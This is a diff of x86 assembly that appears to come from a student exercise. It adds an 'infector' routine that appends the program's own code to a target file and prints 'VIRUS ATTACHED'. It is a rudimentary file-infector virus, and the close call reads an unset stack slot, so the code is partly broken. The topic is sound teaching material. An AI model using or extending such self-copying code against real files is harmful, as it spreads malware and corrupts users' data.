@@ -2,10 +2,14 @@ CLOSE EQU 6
 WRITE EQU 4
 OPEN EQU 5
 STDOUT EQU 1
+O_WRONLY  EQU      0x1
+O_APPEND  EQU      0x400
 
 section .data
     hello_msg db "Hello, Infected File", 0xA ; Message to print
     hello_len equ $ - hello_msg              ; Length of the message
+    virus_msg db "VIRUS ATTACHED", 0xA
+    virus_len equ $ - virus_msg
 
 section .text
 global infection
@@ -56,9 +60,10 @@ system_call:
 code_start:
 
 infection:
-    push dword[hello_msg]
-    call strlen
-    mov edx, eax
+    push ebp
+    mov ebp, esp
+    pushad
+    mov edx, hello_len
     mov eax, WRITE
     mov ebx, STDOUT
     mov ecx, hello_msg
@@ -68,26 +73,33 @@ infection:
     push eax
     call system_call
     add esp, 16
+    popad
+    pop ebp
     ret
 
 infector:
+    push ebp
+    mov ebp, esp
+    sub esp, 4 
+    pushad
     mov eax, OPEN
     mov ebx, [ebp+8]
-    mov ecx, 0x401
+    mov ecx, O_WRONLY | O_APPEND
+    mov edx, 0777
     push edx
     push ecx
     push ebx
     push eax
     call system_call
     add esp, 16
-    test eax, eax
-    jz exit_error
+    cmp eax, 0
+    jl exit_error
     mov esi, eax 
 
     ;write the infection code to the file
     mov eax, WRITE
     mov ebx, esi
-    lea ecx, [code_start]
+    mov ecx, code_start
     mov edx, code_end
     sub edx, code_start
     push edx
@@ -96,10 +108,29 @@ infector:
     push eax
     call system_call
     add esp, 16
+    cmp eax, 0
+    jl exit_error
 
     ;close the file
     mov eax, CLOSE
-    mov ebx, esi
+    mov ebx, [ebp-4]
+    push ebx
+    push eax
+    call system_call
+    add esp, 8
+
+    call print_virus_attached
+
+    popad
+    add esp,4
+    pop ebp
+    ret
+
+print_virus_attached:
+    mov edx, virus_len
+    mov eax, WRITE
+    mov ebx, STDOUT
+    mov ecx, virus_msg
     push edx
     push ecx
     push ebx
@@ -109,6 +140,8 @@ infector:
     ret
 
 exit_error:
+    popad
+    pop ebp
     mov eax, 1              ; SYS_exit
     mov ebx, 0x55           ; Exit code 0x55
     push edx
